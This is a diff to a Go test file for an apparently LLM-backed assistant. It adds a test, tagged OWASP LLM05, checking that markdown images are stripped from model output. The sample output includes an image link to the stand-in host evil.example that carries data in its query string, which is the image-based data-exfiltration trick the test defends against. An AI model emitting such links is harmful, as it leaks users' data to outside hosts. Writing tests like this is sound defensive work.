@@ -32,6 +32,19 @@ func TestNumberedPseudoMarkersBecomeMarkers(t *testing.T) {
 	}
 }
 
+// OWASP LLM05: a markdown image would make the browser call any URL, with data in it; none survive.
+func TestImagesAreRemovedEvenFromToolURLs(t *testing.T) {
+	st := &turnState{}
+	st.refs = []Source{{Ref: 1, URL: "https://github.com/avito-tech/playbook/blob/x/a.md"}}
+	text, _ := st.finishText("Готово ![ok](https://evil.example/p.png?d=liza). Вот ![](https://github.com/avito-tech/playbook/blob/x/a.md) и [Playbook](https://github.com/avito-tech/playbook/blob/x/a.md).", domain.ThreadGeneral)
+	if text != "Готово. Вот и [Playbook](https://github.com/avito-tech/playbook/blob/x/a.md)." {
+		t.Fatalf("text = %q", text)
+	}
+	if len(st.violations) != 2 {
+		t.Errorf("violations = %v", st.violations)
+	}
+}
+
 func TestPseudoMarkersAreRemoved(t *testing.T) {
 	st := &turnState{}
 	st.refs = []Source{{Ref: 1, URL: "https://x.test"}}
